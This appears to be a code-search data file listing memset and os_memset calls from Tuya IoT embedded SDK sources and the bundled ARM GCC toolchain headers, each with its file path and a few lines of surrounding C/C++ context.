2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(inbuf, 0, len);",120,1,"        {
            bkreg_run_command(inbuf, len);
            os_memset(inbuf, 0, len);
        }
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(&httpclient, 0, sizeof(httpclient_t));",120,1,"        goto HTTP_CMD_ERR;
    }    
    os_memset(&httpclient, 0, sizeof(httpclient_t));
    os_memset(&httpclient_data, 0, sizeof(httpclient_data));
    os_memset(&http_content, 0, sizeof(HTTP_RESP_CONTENT_LEN));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(&httpclient_data, 0, sizeof(httpclient_data));",120,1,"    }    
    os_memset(&httpclient, 0, sizeof(httpclient_t));
    os_memset(&httpclient_data, 0, sizeof(httpclient_data));
    os_memset(&http_content, 0, sizeof(HTTP_RESP_CONTENT_LEN));
    httpclient.header = ""Accept: text/xml,text/html,\r\n""; 
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(&http_content, 0, sizeof(HTTP_RESP_CONTENT_LEN));",120,1,"    os_memset(&httpclient, 0, sizeof(httpclient_t));
    os_memset(&httpclient_data, 0, sizeof(httpclient_data));
    os_memset(&http_content, 0, sizeof(HTTP_RESP_CONTENT_LEN));
    httpclient.header = ""Accept: text/xml,text/html,\r\n""; 
    httpclient_data.response_buf = http_content; 
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(p_ADC_drv_desc->pData, 0x00, p_ADC_drv_desc->data_buff_size * sizeof(UINT16));",120,1,"        p_ADC_drv_desc->data_buff_size = ADC_TEMP_BUFFER_SIZE;
        p_ADC_drv_desc->pData = (UINT16 *)os_malloc(p_ADC_drv_desc->data_buff_size * sizeof(UINT16));
        os_memset(p_ADC_drv_desc->pData, 0x00, p_ADC_drv_desc->data_buff_size * sizeof(UINT16));

        if(p_ADC_drv_desc->pData == NULL)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset(message, 0, 256);",120,1,"    int nMessageLen = 0;

    os_memset(message, 0, 256);
    pos = message;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_cli.c,"os_memset((void *)pCli, 0, sizeof(struct cli_st));",120,1,"        return kNoMemoryErr;

    os_memset((void *)pCli, 0, sizeof(struct cli_st));
    rtos_init_semaphore(&log_rx_interrupt_sema, 10);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_ui.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_ui.c,"os_memset(g_ap_param_ptr, 0x00, sizeof(*g_ap_param_ptr));",120,1,"    }

    os_memset(g_ap_param_ptr, 0x00, sizeof(*g_ap_param_ptr));

    if(MAC_ADDR_NULL((u8 *)&g_ap_param_ptr->bssid))
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_ui.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_ui.c,"os_memset(&scan_param.bssid, 0xff, ETH_ALEN);",120,1,"    bk_wlan_sta_init(0);

    os_memset(&scan_param.bssid, 0xff, ETH_ALEN);
	scan_param.vif_idx = INVALID_VIF_IDX;
	scan_param.num_ssids = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_ui.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wlan_ui\wlan_ui.c,"os_memset(&addr, 0, sizeof(struct wlan_ip_config));",120,1,"    struct wlan_ip_config addr;

    os_memset(&addr, 0, sizeof(struct wlan_ip_config));

    switch ( inInterface )
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfssl\wolfcrypt\types.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\wolfssl\wolfssl\wolfcrypt\types.h,"#define XMEMSET(b,c,l)    memset((b),(c),(l))",120,1,"        #include <string.h>
        #define XMEMCPY(d,s,l)    memcpy((d),(s),(l))
        #define XMEMSET(b,c,l)    memset((b),(c),(l))
        #define XMEMCMP(s1,s2,n)  memcmp((s1),(s2),(n))
        #define XMEMMOVE(d,s,l)   memmove((d),(s),(l))
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\mem_arch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\mem_arch.c,"void *os_memset(void *b, int c, UINT32 len)",120,1,"}

void *os_memset(void *b, int c, UINT32 len)
{
    return (void *)memset(b, c, (unsigned int)len);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\mem_arch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\mem_arch.c,"return (void *)memset(b, c, (unsigned int)len);",120,1,"void *os_memset(void *b, int c, UINT32 len)
{
    return (void *)memset(b, c, (unsigned int)len);
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\mem_arch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\mem_arch.c,"os_memset(n, 0, size);",120,1,"    
	if (n)
		os_memset(n, 0, size);
	return n;
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\rtos_pub.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\rtos_pub.c,"memset(&xTaskStatus, 0x00, sizeof(xTaskStatus));",120,1,"    }

    memset(&xTaskStatus, 0x00, sizeof(xTaskStatus));
    vTaskGetInfo(*thread, &xTaskStatus, pdFALSE, eInvalid);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\portable\MemMang\heap_4.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\FreeRTOSv9.0.0\FreeRTOS\Source\portable\MemMang\heap_4.c,"os_memset(pvReturn, 0, xWantedSize);",120,1,"	#if OSMALLOC_STATISTICAL
	if(pvReturn && need_zero)
		os_memset(pvReturn, 0, xWantedSize);
	#endif
	return pvReturn;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\include\mem_pub.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\os\include\mem_pub.h,"void *os_memset(void *b, int c, UINT32 len);",120,1,"void *os_memmove(void *out, const void *in, UINT32 n);
void *os_memcpy(void *out, const void *in, UINT32 n);
void *os_memset(void *b, int c, UINT32 len);
void os_mem_init(void);
void *os_realloc(void *ptr, size_t size);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\char_traits.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\char_traits.h,"{ return static_cast<char_type*>(__builtin_memset(__s, __a, __n)); }",120,1,"      static char_type*
      assign(char_type* __s, size_t __n, char_type __a)
      { return static_cast<char_type*>(__builtin_memset(__s, __a, __n)); }

      static _GLIBCXX_CONSTEXPR char_type
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\char_traits.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\char_traits.h,"{ return wmemset(__s, __a, __n); }",120,1,"      static char_type*
      assign(char_type* __s, size_t __n, char_type __a)
      { return wmemset(__s, __a, __n); }

      static _GLIBCXX_CONSTEXPR char_type
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\hashtable.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\hashtable.h,"__builtin_memset(_M_buckets, 0, _M_bucket_count * sizeof(__bucket_type));",120,1,"    {
      this->_M_deallocate_nodes(_M_begin());
      __builtin_memset(_M_buckets, 0, _M_bucket_count * sizeof(__bucket_type));
      _M_element_count = 0;
      _M_before_begin._M_nxt = nullptr;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\hashtable_policy.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\hashtable_policy.h,"__builtin_memset(__p, 0, __n * sizeof(__bucket_type));",120,1,"      auto __ptr = __bucket_alloc_traits::allocate(__alloc, __n);
      __bucket_type* __p = std::__addressof(*__ptr);
      __builtin_memset(__p, 0, __n * sizeof(__bucket_type));
      return __p;
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\stl_algobase.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\stl_algobase.h,"__builtin_memset(__first, static_cast<unsigned char>(__tmp),",120,1,"    {
      const _Tp __tmp = __c;
      __builtin_memset(__first, static_cast<unsigned char>(__tmp),
		       __last - __first);
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\valarray_array.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\arm-none-eabi\include\c++\4.9.3\bits\valarray_array.h,"{ __builtin_memset(__b, 0, (__e - __b) * sizeof(_Tp)); }",120,1,"      inline static void
      _S_do_it(_Tp* __b, _Tp* __e)
      { __builtin_memset(__b, 0, (__e - __b) * sizeof(_Tp)); }
    };

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\hash-table.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\hash-table.h,"memset (entries, 0, size * sizeof (value_type *));",120,1,"    }
  else
    memset (entries, 0, size * sizeof (value_type *));
  htab->n_deleted = 0;
  htab->n_elements = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\vec.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\vec.h,"memset (&(v->address ()[oldlen]), 0, sizeof (T) * (len - oldlen));",120,1,"  unsigned oldlen = vec_safe_length (v);
  vec_safe_grow (v, len PASS_MEM_STAT);
  memset (&(v->address ()[oldlen]), 0, sizeof (T) * (len - oldlen));
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\vec.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\toolchain\gcc-arm-none-eabi-4_9-2015q1\lib\gcc\arm-none-eabi\4.9.3\plugin\include\vec.h,"memset (&(address ()[oldlen]), 0, sizeof (T) * (len - oldlen));",120,1,"  unsigned oldlen = length ();
  quick_grow (len);
  memset (&(address ()[oldlen]), 0, sizeof (T) * (len - oldlen));
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_common\tuya_main.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_common\tuya_main.c,"memset(prod_ssid_name, 0, sizeof(prod_ssid_name));",120,1,"        return;
    }
    memset(prod_ssid_name, 0, sizeof(prod_ssid_name));
    strncpy(prod_ssid_name, ssid, WF_SSID_LEN);
    return;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_drv_adc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_drv_adc.c,"memset(adc_desc[adc_channel].pData, 0, adc_desc[adc_channel].data_buff_size * SIZEOF(unsigned short));",120,1,"    *(unsigned short*)result = 0xFFFF;
    
    memset(adc_desc[adc_channel].pData, 0, adc_desc[adc_channel].data_buff_size * SIZEOF(unsigned short));

    GLOBAL_INT_DISABLE();
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_bt.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_bt.c,"memset(&adv_info, 0x00, sizeof(adv_info));",120,1,"    LOG_DEBUG(""!!!!!!!!!!tuya_os_adapt_bt_reset_adv\r\n"");

    memset(&adv_info, 0x00, sizeof(adv_info));

    adv_info.channel_map = 7;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_ota.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_ota.c,"memset(ug_proc,0,sizeof(UG_PROC_S));",120,1,"    }

    memset(ug_proc,0,sizeof(UG_PROC_S));
    first_block = 1;
    
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_ota.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_ota.c,"memset(&ug_proc->file_header, 0, sizeof(UPDATE_FILE_HDR_S));",120,1,"
            if((ug_proc->file_header.header_flag !=  UG_PKG_HEAD) || (ug_proc->file_header.tail_flag !=  UG_PKG_TAIL) || (ug_proc->file_header.head_sum != sum_tmp )) {
                memset(&ug_proc->file_header, 0, sizeof(UPDATE_FILE_HDR_S));
                LOG_ERR(""bin_file data header err: header_flag(0x%x) tail_flag(0x%x) bin_sum(0x%x) get_sum(0x%x)\r\n"",ug_proc->file_header.header_flag,ug_proc->file_header.tail_flag,ug_proc->file_header.head_sum,sum_tmp);
                return OPRT_OS_ADAPTER_OTA_START_INFORM_FAILED;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_ota.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_ota.c,"memset(buf, 0xFF , RT_IMG_WR_UNIT);",120,1,"                    }

                    memset(buf, 0xFF , RT_IMG_WR_UNIT);  // make dummy data 
                    tuya_os_adapt_flash_set_protect(FALSE);
                    if(tuya_os_adapt_flash_write(ug_proc->flash_addr, buf, RT_IMG_WR_UNIT)) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"memset(array, 0, (sizeof(AP_IF_S) * scan_cnt));",120,1,"    }
    
	memset(array, 0, (sizeof(AP_IF_S) * scan_cnt));
    for(i = 0; i < scan_cnt; i++) {
        scan_rst_ptr = scan_rst->res[i];
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"memset(item->ssid, 0, ssid_len);",120,1,"        }

        memset(item->ssid, 0, ssid_len);
        os_strncpy((char*)item->ssid, scan_rst_ptr->ssid, ssid_len);
		item->s_len = ssid_len;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"memset(array, 0, sizeof(AP_IF_S));",120,1,"    }
    
    memset(array, 0, sizeof(AP_IF_S));
    array->rssi = -100;

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"memset(array->ssid, 0, ssid_len);",120,1,"        }

        memset(array->ssid, 0, ssid_len);
        os_strncpy((char*)array->ssid, scan_rst_ptr->ssid, ssid_len);
        array->s_len = ssid_len;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"os_memset(&wNetConfig, 0x0, sizeof(IPStatusTypedef));",120,1,"    WiFi_Interface iface;

    os_memset(&wNetConfig, 0x0, sizeof(IPStatusTypedef));

    switch ( wf ) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"os_memset(&wNetConfig, 0x0, sizeof(network_InitTypeDef_ap_st));",120,1,"    network_InitTypeDef_ap_st wNetConfig;

    os_memset(&wNetConfig, 0x0, sizeof(network_InitTypeDef_ap_st));

    switch ( cfg->md ) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\tuya_os_adapter\src\driver\tuya_os_adapt_wifi.c,"memset(frame_msg->data, 0, len);",120,1,"        return OPRT_MALLOC_FAILED;
    }
    memset(frame_msg->data, 0, len);
    
    memcpy(frame_msg->data, frame, len);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\sdk\include\tuya_ffs_stream.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\sdk\include\tuya_ffs_stream.h,"memset(&name, 0x00, sizeof(name)); \",120,1,"    CHAR_T name ## data[size] = {0}; \
    tuya_ffs_stream_t name ; \
    memset(&name, 0x00, sizeof(name)); \
    name.data = name ## data; \
    name.max_size = size; \
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\sdk\include\coap2\address.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\sdk\include\coap2\address.h,"memset( dst, 0, sizeof( coap_address_t ) );",120,1,"  memcpy( dst, src, sizeof( coap_address_t ) );
#else
  memset( dst, 0, sizeof( coap_address_t ) );
  dst->size = src->size;
  if ( src->addr.sa.sa_family == AF_INET6 ) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\sdk\include\coap2\uthash.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\sdk\include\coap2\uthash.h,"#define uthash_bzero(a,n) memset(a,'\0',n)",120,1,"#endif
#ifndef uthash_bzero
#define uthash_bzero(a,n) memset(a,'\0',n)
#endif
#ifndef uthash_memcmp
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_bl0937_1_plug_demo\src\app_dltj.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_bl0937_1_plug_demo\src\app_dltj.c,"memset(buf,0,buf_len);",120,1,"    }

    memset(buf,0,buf_len);
    INT_T Num = ufread(fp, (UCHAR_T *)buf,buf_len);
    if(Num <= 0) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\common\device_config_load.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\common\device_config_load.c,"memset(&gtDeviceCfg, 0, SIZEOF(DEVICE_CONFIG_T));",120,1,"{
    ucOemConfigLoadFlag = FALSE;
    memset(&gtDeviceCfg, 0, SIZEOF(DEVICE_CONFIG_T));
    
    gtDeviceCfg.ctrl_pin = PIN_NOEXIST;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCtrlData, 0, SIZEOF(LIGHT_CTRL_DATA_T));",120,1,"    vLightShadeCtrlDisable();

    memset(&tLightCtrlData, 0, SIZEOF(LIGHT_CTRL_DATA_T));

    tLightCtrlData.bSwitch = TRUE;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCfgData, 0, SIZEOF(LIGHT_CTRL_CFG_T));",120,1,"    }

    memset(&tLightCfgData, 0, SIZEOF(LIGHT_CTRL_CFG_T));
    memcpy(&tLightCfgData, pConfigData, SIZEOF(LIGHT_CTRL_CFG_T));
    memset(&tLightCtrlHandle, 0, SIZEOF(LIGHT_CTRL_HANDLE_T));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCtrlHandle, 0, SIZEOF(LIGHT_CTRL_HANDLE_T));",120,1,"    memset(&tLightCfgData, 0, SIZEOF(LIGHT_CTRL_CFG_T));
    memcpy(&tLightCfgData, pConfigData, SIZEOF(LIGHT_CTRL_CFG_T));
    memset(&tLightCtrlHandle, 0, SIZEOF(LIGHT_CTRL_HANDLE_T));

    memset(&tAPPData, 0, SIZEOF(LIGHT_APP_DATA_FLASH_T));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tAPPData, 0, SIZEOF(LIGHT_APP_DATA_FLASH_T));",120,1,"    memset(&tLightCtrlHandle, 0, SIZEOF(LIGHT_CTRL_HANDLE_T));

    memset(&tAPPData, 0, SIZEOF(LIGHT_APP_DATA_FLASH_T));
    opRet = opUserFlashReadAppData(&tAPPData);       /* read app flash data! */
    if(opRet != LIGHT_OK) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightCtrlHandle.tCurrVal, 0, SIZEOF(BRIGHT_DATA_T));",120,1,"    }

    memset(&tLightCtrlHandle.tCurrVal, 0, SIZEOF(BRIGHT_DATA_T));
    /* when CCT shut down, need to turn off CCT */
    PR_DEBUG(""CCT turn off!"");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(Result, 0, SIZEOF(BRIGHT_DATA_T));",120,1,"    STATIC LIGHT_MODE_E LastMode = MODE_MAX ;

    memset(Result, 0, SIZEOF(BRIGHT_DATA_T));

    switch(Mode) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\apps\bk7231t_light_pwm_demo\src\light_app\light_control.c,"memset(&tLightSceneCtrlParm, 0, SIZEOF(LIGHT_SCENE_CTRL_T));",120,1,"    vLightCtrlShadeStop();  /* stop other shade firstly */

    memset(&tLightSceneCtrlParm, 0, SIZEOF(LIGHT_SCENE_CTRL_T));

    tLightCtrlHandle.ucSceneUnit = strlen(tLightCtrlData.cScene + 2) / SCENE_UNIT_LENGTH;
"
